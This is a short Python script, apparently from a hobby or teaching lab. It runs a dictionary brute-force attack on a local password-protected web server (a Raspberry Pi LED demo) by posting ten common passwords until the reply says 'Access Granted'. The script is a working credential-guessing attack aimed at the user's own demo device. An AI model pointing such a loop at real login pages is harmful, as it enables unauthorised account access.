import requests
import time

# Target URL - Change to Raspberry Pi's IP address if running from another computer
# e.g., url = 'http://192.168.1.100:5000/'
url = 'http://127.0.0.1:5000/'

# Top 10 most common passwords
passwords = [
    "123456",
    "password",
    "123456789",
    "12345678",
    "12345",
    "111111",
    "1234567",
    "sunshine",
    "qwerty",
    "iloveyou"
]

def access_granted(response_text):
    return "Access Granted" in response_text

print(f"Starting brute force attack on {url}...\n")

for pwd in passwords:
    print(f"Trying password: {pwd}")
    
    # Send POST request
    try:
        response = requests.post(url, data={'password': pwd})
        
        if access_granted(response.text):
            print(f"\n[SUCCESS] Password found: {pwd}")
            print("LED should be ON now.")
            break
        else:
            print("[FAILED] Incorrect password.")
            
    except requests.exceptions.ConnectionError as e:
        print(f"[ERROR] Could not connect to server. Is it running? Error: {e}")
        break
        
    time.sleep(0.5) # Be nice to the server
